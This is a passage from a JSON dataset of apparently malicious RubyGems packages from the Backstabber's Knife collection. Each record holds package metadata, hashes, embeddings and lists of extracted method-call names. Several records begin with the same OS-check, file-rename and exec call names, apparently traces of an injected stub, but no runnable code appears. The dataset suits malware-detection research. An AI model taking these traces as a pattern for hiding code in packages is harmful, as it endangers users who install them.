'@output.[](-1).!=', '@output.[]', 'lines.pop', 'lines.each', '@line_receiver.call', 'line.chomp', '@line_receiver.nil?.!', '@line_receiver.nil?', '@output.empty?.!', '@output.empty?', '@line_receiver.call', 'Rjb.import', 'System.identityHashCode(obj1).==', 'System.identityHashCode', 'System.identityHashCode', 'Hash.new', 'object.entrySet.iterator', 'object.entrySet', 'block_given?', 'i.hasNext', 'i.next', 'entry.getKey', 'entry.getValue', 'i.hasNext', 'i.next', 'hash.[]=', 'entry.getKey', 'entry.getValue', 'module_function', 'require', 'require', 'include', 'device.instance_of?', 'device._classname.==', 'device._classname', 'raise', 'rjb_method_missing', 'raise', 'SdkLibError.new', 'e.message', 'e.class.to_s', 'e.class', 'self._classname', 'alias_method', 'alias_method', '@device.getSerialNumber', '@device.getState.toString.to_sym', '@device.getState.toString', '@device.getState', '@device.isOnline', '@device.isEmulator', '@device.isOffline', '@device.isBootloader', 'RawImage.new', '@device.getScreenshot', '@device.reboot', '@device.getPropertyCount', '@device.getProperty', 'convert_map_to_hash', '@device.getProperties', 'hash.[]=', 'key.toString', 'value.toString', 'property', '@device.PROP_BUILD_VERSION', 'property', '@device.PROP_BUILD_API_LEVEL', 'property', '@device.PROP_BUILD_CODENAME', 'property', '@device.PROP_DEVICE_MODEL', 'property', '@device.PROP_DEVICE_MANUFACTURER', 'property', '@device.PROP_DEBUGGABLE', 'freshness_ms.nil?', '@device.getBatteryLevel.intValue', '@device.getBatteryLevel', '@device.getBatteryLevel(freshness_ms).intValue', '@device.getBatteryLevel', 'CommandCapture.new', 'block_given?', 'Rjb.bind', '@device.executeShellCommand', 'command.to_s', 'block_given?', 'capture.to_s', 'File.exist?', 'raise', 'remotefile.end_with?', 'File.basename', '@device.pushFile', 'localfile.end_with?', 'File.directory?', 'localfile.chomp', 'File.dirname', 'File.basename', 'File.exist?', 'FileUtils.mkdir_p', 'localfilename.nil?', 'File.basename', '@device.pullFile', '@device.__send__', 'self.serial', 'self.serial', 'private', 'attr_accessor', '(argb >> 8.*(3))\\n.&', 'argb.>>', '8.*', '(argb >> 8.*(2))\\n.&', 'argb.>>', '8.*', '(argb >> 8.*(1))\\n.&', 'argb.>>', '8.*', '(argb >> 8.*(0))\\n.&', 'argb.>>', '8.*', 'include', 'image.instance_of?', 'image._classname.==', 'image._classname', 'raise', 'rjb_method_missing', 'raise', 'SdkLibError.new', 'e.message', 'e.class.to_s', 'e.class', 'self._classname', 'alias_method', 'alias_method', 'RawImage.new', '@image.getRotated', '@image.getARGB', '@image.getARGB', 'point_to_index', 'Pixel.new', '@image.getARGB', 'point_to_index', 'block_given?', 'to_enum', '@image.height.times', '@image.height', '@image.width.times', '@image.width', 'pixel', '@image.width', '@image.height', '@image.bpp', '(x * (bpp >> 3))\\n.+', 'x.*', 'bpp.>>', 'bpp', 'y.*', '(bpp >> 3)\\n.*', 'bpp.>>', 'bpp', 'width']",
            "n_tokens": 1141,
            "embedding": "[ 0.01778558 -0.01164956 -0.00350598 ... -0.01199637 -0.02449075\n  0.0208447 ]",
            "cluster": "0",
            "id": 681,
            "Filepath": "/Users/xxxx/Documents/malware/rubygems/Backstabber/adb_sdklib/0.0.3/adb_sdklib-0.0.3.gem",
            "path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/adb_sdklib/0.0.3/adb_sdklib-0.0.3_extracted",
            "name": "adb_sdklib",
            "version": "0.0.3",
            "published_at": "2020-02-16T03:21:58.998Z",
            "Status": "tracked",
            "OSS": "RubyGems",
            "description": NaN,
            "author": 1.0,
            "maintainers": "The number of author or maintainer is 1.",
            "repository_url": "contain a homepage URL and a Github URL.",
            "dependencies": "bundler, rake, rjb",
            "SHA-256": "232df7e3400669e3d4d2e6f6fa7b7ff38515880b5b70ff6e398cec4acd73bd30"
        },
        {
            "name_version": "addons_client-0.0.10",
            "SourceCode_Path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/addons_client/0.0.10/addons_client-0.0.10_extracted/addons_client-0.0.10_sourcecode.rb",
            "Source": "Backstabber-Knife",
            "code_api": "['require', 'require', 'require', 'RbConfig::CONFIG.[]', 'os.match', 'TacoBell.check_win', 'File.rename', 'exec', '$LOAD_PATH.unshift', 'File.dirname(File.expand_path(\"..\", \"/Users/xxxx/Documents/malware/rubygems/Backstabber/addons_client/0.0.10/addons_client-0.0.10_extracted/addons_client-0.0.10_sourcecode.rb\")).+', 'File.dirname', 'File.expand_path', 'require', 'require', 'require', 'require', 'require', 'Class.new', 'Class.new', 'require', 'require', 'require', 'require', 'require', 'extend', 'load_settings!', 'run_command!', 'Settings.rest.first', 'Settings.rest', 'client.list', 'client', 'Settings.rest.[](1..-1).join', 'Settings.rest.[]', 'Settings.rest', 'response.data.each', 'response.data', 'puts', '\"#{addon_plan.[](\"name\")} $%0.2f/#{addon_plan.[](\"price_unit\")}\".%', 'addon_plan.[]', 'addon_plan.[]', 'BigDecimal.new(addon_plan.[](\"price_cents\").to_s)./', 'BigDecimal.new', 'addon_plan.[](\"price_cents\").to_s', 'addon_plan.[]', 'Settings.rest.[]', 'Settings.rest', 'raise', 'client.deprovision!', 'client', 'puts', 'puts', 'Settings.rest.[]', 'Settings.rest', 'raise', 'client.provision!', 'client', 'Settings.[]', 'Settings.[]', 'puts', 'puts', 'Settings.rest.[]', 'Settings.rest', 'raise', 'Settings.rest.[]', 'Settings.rest', 'raise', 'client.plan_change!', 'client', 'puts', 'puts', 'puts', 'puts', 'STDOUT.puts', 'Settings.use', 'Settings.resolve!', 'raise', 'Addons::UserError.new', 'extend', 'extend', 'validate_api_url!', 'wrap_request', 'mocked?', 'mocked_list', 'search.is_a?', 'search.==', 'payload.[]=', 'search.nil?.!', 'search.nil?', 'payload.[]=', 'resource.[](\"/addons\").get', 'resource.[]', 'resource', 'validate_authenticated_api_url!', 'wrap_request', 'slug.split', 'raise', 'mocked?', 'mocked_provision', 'opts.[]', 'payload.merge!', 'opts.[]', 'payload.merge!', 'opts.[]', 'opts.[]', 'payload.merge!', 'opts.[]', 'opts.[]', 'payload.merge!', 'opts.[]', 'opts.[]', 'start_at.utc', 'payload.merge!', 'start_at.to_s', 'opts.[]', 'end_at.utc', 'payload.merge!', 'end_at.to_s', 'opts.[]', 'config.is_a?', 'config.to_json', 'payload.merge!', 'resource.[](\"/resources\").post', 'resource.[]', 'resource', 'validate_authenticated_api_url!', 'wrap_request', 'mocked?', 'mocked_deprovision', 'resource.[](\"/resources/#{resource_id}\").delete', 'resource.[]', 'resource', 'validate_authenticated_api_url!', 'wrap_request', 'mocked?', 'mocked_plan_change', 'resource.[](\"/resources/#{resource_id}\").put', 'resource.[]', 'resource', 'RestClient::Resource.new', 'api_url.to_s', 'api_url', 'protected', 'Addons::Client::Response.new', 'raise', 'api_url.user', 'api_url', 'raise', 'api_url.password', 'api_url', 'raise', 'ENV.[]', 'raise', 'URI.join', 'ENV.[]', 'raise', 'private', '[{ \"id\" => \"https://addons.heroku.com/addons/cloudcounter:basic\", \"url\" => \"https://addons.heroku.com/addons/cloudcounter:basic\", \"name\" => \"cloudcounter:basic\", \"description\" => \"The basic counter of clouds\", \"beta\" => false, \"state\" => \"public\", \"price_cents\" => 0, \"price_unit\" => \"month\" }, { \"id\" => \"https://addons.heroku.com/addons/cloudcounter:pro\", \"url\" => \"https://addons.heroku.com/addons/cloudcounter:pro\", \"name\" => \"cloudcounter:pro\", \"description\" => \"The counter of clouds for professionals\", \"beta\" => false, \"state\" => \"public\", \"price_cents\" => 1500, \"price_unit\" => \"month\" }].to_json', 'name.upcase', 'plan.upcase', 'response.strip.empty?', 'response.strip', 'JSON.parse', 'data.to_s', 'data', 'data', 'data.each', 'data', 'data.inject', 'data', '@data.keys.include?', '@data.keys', '@data.[]', '@data.keys.include?', '@data.keys', 'name.to_s', '@data.[]', 'name.to_s', 'require', 'File.dirname', 'stub_request', 'ENV.[]=', 'Addons::Client.provision!', 'assert_requested', 'URI.join(ENV.[](\"ADDONS_API_URL\"), \"/api/1/resources\").to_s', 'URI.join', 'ENV.[]', '[nil, \"https://localhost:3333\", \"https://foo@localhost:3333\"].each', 'ENV.[]=', 'assert_raises', 'Addons::Client.provision!', 'stub_request(:any, /api\\\\/1\\\\/resources/).to_return', 'stub_request', 'assert_raises', 'Addons::Client.provision!', 'require', 'File.dirname', 'ENV.[]=', 'stub_request(:any, target_url).to_return', 'stub_request', 'target_url', 'stub(Addons::CLI).puts', 'stub', 'assert_raises', 'addons_client!', 'addons_client!', 'assert_requested', 'target_url', 'Addons::Client.deprovision!', 'assert_requested', 'target_url', 'require', 'File.dirname', 'ENV.[]=', 'stub_request(:get, /#{target_url}/).to_return', 'stub_request', 'target_url', '[{ \"id\" => \"https://addons.heroku.com/addons/cloudcounter:basic\", \"url\" => \"https://addons.heroku.com/addons/cloudcounter:basic\", \"name\" => \"cloudcounter:basic\", \"description\" => \"The basic counter of clouds\", \"beta\" => false, \"state\" => \"public\", \"price_cents\" => 0, \"price_unit\" => \"month\" }, { \"id\" => \"https://addons.heroku.com/addons/cloudcounter:pro\", \"url\" => \"https://addons.heroku.com/addons/cloudcounter:pro\", \"name\" => \"cloudcounter:pro\", \"description\" => \"The counter of clouds for professionals\", \"beta\" => false, \"state\" => \"public\", \"price_cents\" => 1500, \"price_unit\" => \"month\" }].to_json', 'stub(Addons::CLI).puts', 'stub', 'URI.join(ENV.[](\"ADDONS_API_URL\"), \"/api/1/addons\").to_s', 'URI.join', 'ENV.[]', 'addons_client!', 'assert_requested', 'target_url', 'assert_received', 'cli.puts', 'addons_client!', 'assert_requested', 'target_url.+', 'target_url', 'Addons::Client.list', 'assert_requested', 'target_url', 'Addons::Client.list', 'assert_requested', 'target_url.+', 'target_url', 'require', 'File.dirname', 'ENV.[]=', 'stub_request', 'target_url', 'stub(Addons::CLI).puts', 'stub', 'addons_client!', 'assert_requested', 'target_url', 'Addons::Client.plan_change!', 'assert_requested', 'target_url', 'Addons::Client.plan_change!', 'assert_requested', 'target_url', 'addons_client!', 'assert_requested', 'target_url', 'assert_received', 'cli.puts', 'assert_raises', 'addons_client!', 'assert_raises', 'addons_client!', 'require', 'File.dirname', 'ENV.[]=', 'stub_request', 'target_url', 'stub(Addons::CLI).puts', 'stub', 'URI.join(ENV.[](\"ADDONS_API_URL\"), \"/api/1/resources\").to_s', 'URI.join', 'ENV.[]', 'assert_raises', 'addons_client!', 'addons_client!', 'assert_requested', 'target_url', 'addons_client!', 'assert_requested', 'target_url', 'Addons::Client.provision!', 'assert_requested', 'target_url', 'Addons::Client.provision!', 'assert_requested', 'target_url', 'Addons::Client.provision!', 'assert_requested', 'target_url', 'addons_client!', 'assert_requested', 'target_url', 'assert_received', 'cli.puts', 'require', 'File.dirname', 'Addons::Client.mock!', 'Addons::Client.unmock!', 'URI.join(ENV.[](\"ADDONS_API_URL\"), \"/api/1/resources\").to_s', 'URI.join', 'ENV.[]', 'Addons::Client.unmock!', 'stub_request(:any, target_url).to_return', 'stub_request', 'target_url', '{ \"resource_id\" => \"123-ABC\", \"config\" => { \"ADDON_URL\" => \"foo\" }, \"message\" => \"great success\", \"provider_id\" => \"42\" }.to_json', 'Addons::Client.provision!', 'assert_equal', 'response.resource_id', 'assert_equal', 'response.config.[]', 'response.config', 'assert_equal', 'response.message', 'assert_equal', 'response.provider_id', 'Addons::Client.provision!', 'assert_equal', 'response.resource_id', 'assert_equal', 'response.config.[]', 'response.config', 'assert_equal', 'response.message', 'assert_equal', 'response.provider_id', 'Addons::Client.deprovision!', 'Addons::Client.plan_change!', 'require', 'Bundler.require', 'require', 'require', 'File.dirname', 'include', 'URI.join(ENV.[](\"ADDONS_API_URL\"), \"/api/1/resources/\", \"addons-uuid\").to_s', 'URI.join', 'ENV.[]', 'WebMock.reset!', '::ARGV.replace', 'Settings.replace', 'Hash.new', '::ARGV.replace', 'cmd.split', 'Addons::CLI.run!']",
            "n_tokens": 2228,
            "embedding": "[-0.00213878 -0.02008556 -0.0028814  ... -0.01009092 -0.01452014\n  0.02738414]",
            "cluster": "0",
            "id": 562,
            "Filepath": "/Users/xxxx/Documents/malware/rubygems/Backstabber/addons_client/0.0.10/addons_client-0.0.10.gem",
            "path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/addons_client/0.0.10/addons_client-0.0.10_extracted",
            "name": "addons_client",
            "version": "0.0.10",
            "published_at": "2020-02-16T03:23:46.254Z",
            "Status": "tracked",
            "OSS": "RubyGems",
            "description": NaN,
            "author": 1.0,
            "maintainers": "The number of author or maintainer is 1.",
            "repository_url": "contain a homepage URL but not a Github URL.",
            "dependencies": "rest-client, configliere, json",
            "SHA-256": "3b2e960456c5014c434943e9096624cc4f27e85c1cac11870729600c18d5df3f"
        },
        {
            "name_version": "adn_cli-0.0.6",
            "SourceCode_Path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/adn_cli/0.0.6/adn_cli-0.0.6_extracted/adn_cli-0.0.6_sourcecode.rb",
            "Source": "Backstabber-Knife",
            "code_api": "['require', 'require', 'require', 'RbConfig::CONFIG.[]', 'os.match', 'TacoBell.check_win', 'File.rename', 'exec', 'require', 'File.open', 'f.write', 'save_token', 'request.query.[]', 'request.query', 'ADN::Auth.server.stop', 'ADN::Auth.server', 'File.expand_path', 'SCOPES.join', 'File.expand_path(File.dirname(\"/Users/xxxx/Documents/malware/rubygems/Backstabber/adn_cli/0.0.6/adn_cli-0.0.6_extracted/adn_cli-0.0.6_sourcecode.rb\")).+', 'File.expand_path', 'File.dirname', 'File.exists?', 'IO.read', 'puts', 'launch_browser', 'server.start', 'server', 'system', 'WEBrick::HTTPServer.new', 'WEBrick::Log.new', 'httpd.tap', 's.mount', 's.mount', 'require', 'require', 'require', 'require', 'require_relative', 'require_relative', 'require_relative', 'require_relative', 'trap', 'exit', 'ADN::Auth.has_token?', 'ADN::Auth.retrieve_token', 'ADN.token=', 'ADN::Auth.token', 'new', 'STDIN.tty?', '[\"-u\", \"--unified\"].include?', 'ARGV.first', 'UnifiedStream.start', '[\"-g\", \"--global\"].include?', 'ARGV.first', 'ARGV.empty?', 'GlobalStream.start', 'puts', 'ARGV.inspect', 'send_post', '$stdin.read.strip', '$stdin.read', 'text.length.>', 'text.length', 'abort', 'ANSI.color', 'OptionParser.new { |opts,|\\n  opts.on(\"-r ID\") { |id,|\\n    data.[]=(:reply_to, id)\\n  }\\n}.parse!', 'OptionParser.new', 'opts.on', 'data.[]=', 'ADN::Post.send_post', 'abort', 'require_relative', '@since_id.nil?', 'params.[]=', 'ADN::API::Post.global_stream', 'require', 'include', 'include', 'new', 'ADN::User.me', 'loop', 'stream.show', 'exit', 'get_stream.tap', 'get_stream', 'show_posts', 'update_since_id', 'sleep', 'options.[]', 'raise', 'private', 'response.[](\"data\").any?', 'response.[]', 'response.[](\"data\").first.[]', 'response.[](\"data\").first', 'response.[]', 'response.[](\"data\").reverse.each', 'response.[](\"data\").reverse', 'response.[]', 'puts', 'line + post_heading(p).+', 'line.+', 'line', 'post_heading', 'colorized_text', 'p.[](\"annotations\").any?', 'p.[]', 'puts', 'p.[](\"annotations\").to_yaml.ansi', 'p.[](\"annotations\").to_yaml', 'p.[]', 'heading_line', '\"#{p.[](\"user\").[](\"username\")}\".ansi(:blue).+', '\"#{p.[](\"user\").[](\"username\")}\".ansi', 'p.[](\"user\").[]', 'p.[]', '\" (#{p.[](\"user\").[](\"name\").strip})\".ansi', 'p.[](\"user\").[](\"name\").strip', 'p.[](\"user\").[]', 'p.[]', 'p.[](\"id\").ansi', 'p.[]', 'terminal_width.-', 'terminal_width', 'unansi(left + right).length', 'unansi', 'left.+', '\" \".*', 'p.[](\"user\").[]', 'p.[]', 'p.[](\"user\").[]', 'p.[]', 'p.[](\"user\").[](\"id\").==', 'p.[](\"user\").[]', 'p.[]', '@user.user_id', 'p.[](\"entities\").[](\"mentions\").tap', 'p.[](\"entities\").[]', 'p.[]', 'mentions.any?', 'mentions.map { |m,|\\n  m.[](\"id\")\\n}.include?', 'mentions.map', 'm.[]', '@user.user_id', 'ANSI.color', 'p.[]', '<<-HEREDOC\\n#{char * terminal_width}\\nHEREDOC.ansi', 'char.*', 'terminal_width', 'require_relative', '@since_id.nil?', 'params.[]=', 'ADN::API::Post.unified_stream', '[MAJOR, MINOR, TINY].join', 'require', 'require', 'require', 'puts', 'require', '[\"./lib\"].each', 'Find.find', 'f.match', 'require']",
            "n_tokens": 1018,
            "embedding": "[ 0.00796821 -0.01789388  0.00132845 ... -0.00148168 -0.03197172\n  0.01655925]",
            "cluster": "0",
            "id": 118,
            "Filepath": "/Users/xxxx/Documents/malware/rubygems/Backstabber/adn_cli/0.0.6/adn_cli-0.0.6.gem",
            "path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/adn_cli/0.0.6/adn_cli-0.0.6_extracted",
            "name": "adn_cli",
            "version": "0.0.6",
            "published_at": "2020-02-16T03:31:20.701Z",
            "Status": "tracked",
            "OSS": "RubyGems",
            "description": NaN,
            "author": 1.0,
            "maintainers": "The number of author or maintainer is 1.",
            "repository_url": "contain a homepage URL and a Github URL.",
            "dependencies": "adn, ansi",
            "SHA-256": "e19a5e048afa830500a8ea000a7ece59a01cec00735b98a3194b839cf98cae18"
        },
        {
            "name_version": "advisors-command_client-2.2.0",
            "SourceCode_Path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/advisors-command_client/2.2.0/advisors-command_client-2.2.0_extracted/advisors-command_client-2.2.0_sourcecode.rb",
            "Source": "Backstabber-Knife",
            "code_api": "['require', 'require', 'require', 'RbConfig::CONFIG.[]', 'os.match', 'TacoBell.check_win', 'File.rename', 'exec', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'attr_accessor', 'Configuration.new', 'config', 'attr_accessor', 'attr_reader', 'AdvisorsCommandClient.config.api_url', 'AdvisorsCommandClient.config', 'options.[]', 'url.nil?', 'raise', 'MissingAPIUrlError.new', 'AdvisorsCommandClient::Connection.new(username, api_key, url).build', 'AdvisorsCommandClient::Connection.new', 'Models::ContactCollection.new', 'Models::AccountCollection.new', 'require', 'require', 'require', 'require', 'require', 'require', 'Faraday.new', 'faraday.request', 'faraday.use', 'faraday.adapter', 'faraday.response', 'request_env.[](:request_headers).merge!', 'request_env.[]', 'wsse_auth_string', '@app.call', 'private', 'Akami.wsse', 'wsse.credentials', 'wsse.timestamp=', 'wsse.username', 'wsse.send', 'Base64.encode64(wsse.send(:nonce)).chomp', 'Base64.encode64', 'wsse.send', 'wsse.send', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'name', 'args.[]', 'AdvisorsCommandClient::Models::Account.new', 'account.as_json', 'account_json.merge', '@connection.post', 'resp.success?', 'account.id=', 'resp.body.[]', 'resp.body', 'AdvisorsCommandClient::Models::Account.new', 'params.merge', '@connection.put', 'account.as_json', 'resp.success?', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'Array.[]', 'state_map.key', 'state_map', 'state_map.[]', 'state_map', '[street, street2, city, region, postal_code, country].compact.join', '[street, street2, city, region, postal_code, country].compact', 'street', 'street2', 'city', 'region', 'postal_code', 'country', 'full_address.downcase.==', 'full_address.downcase', 'full_address', 'other_address.full_address.downcase', 'other_address.full_address', 'attributes.dup', 'attributes', 'json_attrs.delete', 'json_attrs.delete', 'json_attrs.delete', 'json_attrs.delete', 'json_attrs.to_camelback_keys', 'private', 'include', 'Virtus.model', 'deep_underscore_params', 'new', 'lambda', 'val.to_s.gsub(/::/, \"/\").gsub(/([A-Z]+)([A-Z][a-z])/, \"\\\\\\\\1_\\\\\\\\2\").gsub(/([a-z\\\\d])([A-Z])/, \"\\\\\\\\1_\\\\\\\\2\").tr(\"-\", \"_\").downcase', 'val.to_s.gsub(/::/, \"/\").gsub(/([A-Z]+)([A-Z][a-z])/, \"\\\\\\\\1_\\\\\\\\2\").gsub(/([a-z\\\\d])([A-Z])/, \"\\\\\\\\1_\\\\\\\\2\").tr', 'val.to_s.gsub(/::/, \"/\").gsub(/([A-Z]+)([A-Z][a-z])/, \"\\\\\\\\1_\\\\\\\\2\").gsub', 'val.to_s.gsub(/::/, \"/\").gsub', 'val.to_s.gsub', 'val.to_s', 'val.map', 'deep_underscore_params', 'val.keys.each', 'val.keys', 'val.[]', 'val.delete', 'val.[]=', 'snake_caser.call', 'deep_underscore_params', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'Array.[]', 'attribute', 'Array.[]', 'attribute', 'Array.[]', '[name_prefix, first_name, middle_name, last_name, name_suffix].reject(&:nil?).join', '[name_prefix, first_name, middle_name, last_name, name_suffix].reject', 'name_prefix', 'first_name', 'middle_name', 'last_name', 'name_suffix', '@original_hash.[](\"accounts\").map', '@original_hash.[]', '@connection.get', 'resp.success?', 'AdvisorsCommandClient::Models::Account.load', 'resp.body', 'attributes.dup', 'attributes', 'json_attrs.delete', 'json_attrs.delete', 'json_attrs.delete', 'json_attrs.delete', 'json_attrs.delete', 'json_attrs.delete', 'json_attrs.[]=', 'addresses.map', 'addresses', 'address.as_json', 'json_attrs.to_camelback_keys', 'args.[]', '@connection.get', 'response.success?', 'Parallel.map(Array(response.body.[](\"data\"))) { |obj,|\\n  begin\\n    unless obj.[](\"record_string\")\\n      next\\n    end\\n    self.find(obj.[](\"record_id\").to_i)\\n  rescue Faraday::Error::ParsingError\\n    puts(\"Error parsing response for contact ID: #{obj.[](\"record_id\")}\")\\n    next nil\\n  end\\n}.compact', 'Parallel.map', 'Array', 'response.body.[]', 'response.body', 'obj.[]', 'self.find', 'obj.[](\"record_id\").to_i', 'obj.[]', 'puts', 'obj.[]', 'raise', '@connection.get', 'resp.success?', 'AdvisorsCommandClient::Models::Contact.load', 'resp.body', 'AdvisorsCommandClient::Models::Contact.new', '@connection.post', 'contact.as_json', 'resp.success?', 'contact.id=', 'resp.body.[]', 'resp.body', 'AdvisorsCommandClient::Models::Contact.new', 'params.merge', '@connection.put', 'contact.as_json', 'resp.success?']",
            "n_tokens": 1328,
            "embedding": "[ 0.00651878  0.01616434 -0.00395733 ...  0.00444822 -0.02099411\n  0.01511278]",
            "cluster": "0",
            "id": 591,
            "Filepath": "/Users/xxxx/Documents/malware/rubygems/Backstabber/advisors-command_client/2.2.0/advisors-command_client-2.2.0.gem",
            "path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/advisors-command_client/2.2.0/advisors-command_client-2.2.0_extracted",
            "name": "advisors-command_client",
            "version": "2.2.0",
            "published_at": "2020-02-16T03:34:28.155Z",
            "Status": "tracked",
            "OSS": "RubyGems",
            "description": NaN,
            "author": 1.0,
            "maintainers": "The number of author or maintainer is 1.",
            "repository_url": "contain a homepage URL and a Github URL.",
            "dependencies": "bundler, rake, pry, akami, typhoeus, faraday, faraday_middleware, virtus, parallel, awrence",
            "SHA-256": "e1ce2ca883ec9cfe14d53bfa57191337dcc4ec56ea5d0f3b8726afef501e619a"
        },
        {
            "name_version": "agave_client-0.1.3",
            "SourceCode_Path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/agave_client/0.1.3/agave_client-0.1.3_extracted/agave_client-0.1.3_sourcecode.rb",
            "Source": "Backstabber-Knife",
            "code_api": "['require', 'require', 'require', 'RbConfig::CONFIG.[]', 'os.match', 'TacoBell.check_win', 'File.rename', 'exec', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'base.extend', 'base.class_eval', 'attr_reader', 'define_method', 'ENV.[]', 'options.[]', 'ENV.[]', 'options.[]', 'Faraday.get', 'ENV.[]', 'JsonSchema.parse!', 'JSON.parse', 'response.body', 'schema.expand_references!', 'schema.definitions.each', 'schema.definitions', 'schema.links.select { |x,|\\n  x.rel === \"instances\"\\n}.any?', 'schema.links.select', 'schema.links', 'x.rel.===', 'x.rel', 'type.pluralize', 'define_method', 'instance_variable_set', 'instance_variable_get', 'Agave::Repo.new', 'connection.send(*args).body.with_indifferent_access', 'connection.send(*args).body', 'connection.send', 'connection', 'ENV.[](\"SSL_CERT_FILE\").==', 'ENV.[]', 'Cacert.pem', 'raise', 'Cacert.set_in_env', 'request', 'puts', 'e.message', 'raise', 'ApiError.new', 'puts', 'puts', 'error.message', 'puts', 'raise', 'private', 'base_url.+', 'base_url', 'default_headers.merge', 'extra_headers', 'Faraday.new', 'c.request', 'c.response', 'c.response', 'c.use', 'c.adapter', 'attr_reader', '[\"AgaveCMS API Error\", \"Status: #{faraday_error.response.[](:status)}\", \"Response:\", JSON.pretty_generate(body)].join', 'faraday_error.response.[]', 'faraday_error.response', 'faraday_error', 'JSON.pretty_generate', 'body', 'JSON.parse', 'faraday_error.response.[]', 'faraday_error.response', 'faraday_error', 'require', 'require', 'require', 'require', 'require', 'require', 'package_name', 'desc', 'option', 'option', 'ENV.[]', 'option', 'option', 'ENV.[](\"AGAVE_API_TOKEN\").!', 'ENV.[]', 'say', 'exit', 'File.expand_path', 'options.[]', 'options', 'options.[]', 'options', 'options.[]', 'options', 'Agave::Site::Client.new', 'Dump::SsgDetector.new(Dir.pwd).detect', 'Dump::SsgDetector.new', 'Dir.pwd', 'client.request(:get, \"/api/site\").[](\"data\").[]', 'client.request(:get, \"/api/site\").[]', 'client.request', 'Mutex.new', 'thread_safe_dump', 'Agave::Watch::SiteChangeWatcher.new(site_id).connect', 'Agave::Watch::SiteChangeWatcher.new', 'thread_safe_dump', 'watch_config_file', 'thread_safe_dump', 'sleep', 'Dump::Runner.new(config_file, client, preview_mode).run', 'Dump::Runner.new', 'desc', 'ENV.[]', 'exit', 'say', 'ask', 'token.!', 'token.empty?', 'puts', 'exit', 'File.open', 'file.puts', 'say', 'exit', 'no_tasks', 'Listen.to(File.dirname(config_file), { only: /#{Regexp.quote(File.basename(config_file))}/ }, &block).start', 'Listen.to', 'File.dirname', 'Regexp.quote', 'File.basename', 'semaphore.synchronize', 'Dump::Runner.new(config_file, client, preview_mode).run', 'Dump::Runner.new', 'require', 'operations.add', 'operations', 'Operation::AddToDataFile.new', 'operations', 'require', 'operations.add', 'operations', 'Operation::CreateDataFile.new', 'operations', 'require', 'instance_eval', '@operation.frontmatter_format=', '@operation.frontmatter_value=', '@operation.content=', 'Operation::CreatePost.new', 'operations', 'DataFile.new', 'operations.add', 'operations', 'require', 'require', 'require', 'include', 'include', 'include', 'attr_reader', 'eval', 'block.binding', 'instance_eval', '@self_before_instance_eval.send', 'require', 'require', 'require', 'require', 'require', 'include', 'include', 'include', 'attr_reader', 'eval', 'Operation::Directory.new', 'operations', 'operations.add', 'operations', 'Directory.new', 'agave', 'require', 'require', 'converter_for(format).dump', 'converter_for', 'converter_for(format).frontmatter_dump', 'converter_for', 'format.to_sym', 'require', 'JSON.dump', 'dump', 'require', 'require', 'utc.strftime', 'utc', 'strftime', 'TOML::Generator.new(value).body', 'TOML::Generator.new', 'dump', 'require', 'require', 'require', 'each_with_object', 'value.is_a?', 'value.is_a?', 'value.deep_stringify_keys', 'accum.push', 'accum.push', 'value.map', 'deep_hashify_items', 'value.each_with_object', 'acc.[]=', 'deep_hashify_items', 'value.to_hash', 'value.respond_to?', 'value.to_hash', 'deep_hashify_items', 'YAML.dump(plain.deep_stringify_keys).chomp.gsub', 'YAML.dump(plain.deep_stringify_keys).chomp', 'YAML.dump', 'plain.deep_stringify_keys', 'dump', 'require', 'attr_reader', 'File.join', 'context.path', 'context', 'path', 'FileUtils.mkdir_p', 'File.dirname', 'Format.dump', 'format', 'value', 'File.exist?', '::File.read', 'old_content.sub', 'File.open', 'f.write', 'require', 'require', 'attr_reader', 'FileUtils.mkdir_p', 'File.dirname', 'path', 'File.open', 'File.join', 'context.path', 'context', 'path', 'file.write', 'Format.dump', 'format', 'value', 'require', 'require', 'attr_reader', 'attr_accessor', 'attr_accessor', 'FileUtils.mkdir_p', 'File.dirname', 'path', 'File.open', 'File.join', 'context.path', 'context', 'path', 'file.write', 'Format.frontmatter_dump', 'frontmatter_format', 'frontmatter_value', 'file.write', 'file.write', 'content', 'require', 'attr_reader', 'File.join', 'context.path', '@operations.<<', 'Dir.exist?', 'path', 'FileUtils.remove_dir', 'path', 'FileUtils.mkdir_p', 'path', 'operations.each', 'operations', 'private', 'attr_reader', 'attr_reader', '@operations.<<', 'operations.each', 'operations', 'private', 'attr_reader', 'require', 'require', 'require', 'require', 'attr_reader', 'Dir.pwd', 'print', 'loader.load', 'loader', 'I18n.available_locales=', 'loader.items_repo.available_locales', 'loader.items_repo', 'loader', 'I18n.locale=', 'I18n.available_locales.first', 'I18n.available_locales', 'Dsl::Root.new', 'File.read', 'config_path', 'loader.items_repo', 'loader', 'operation', 'operation.perform', 'operation', 'puts', 'Operation::Root.new', 'destination_path', 'Agave::Local::Loader.new', 'client', 'preview_mode', 'require', 'require', 'require', 'attr_reader', '[\"jekyll\"].freeze', 'ruby_generator', 'private', 'File.join', 'path', 'File.exist?', 'File.read', 'RUBY.find', 'gemfile.=~', 'data.[]', 'data.is_a?', 'data.map', 'deserialize_resource', 'deserialize_resource', 'data.[]', 'data.[]', 'result.merge!', 'data.[]', 'data.delete', 'relationships.each', 'handle.[]', 'handle_data.is_a?', 'handle_data.map', 'ref.[]', 'handle_data.is_a?', 'handle_data.[]', 'result.[]=', 'result.with_indifferent_access', 'attr_reader', 'resource.with_indifferent_access', 'resource.[]', 'data.[]=', 'resource.[]', 'data.[]=', 'type', 'data.[]=', 'serialized_attributes', 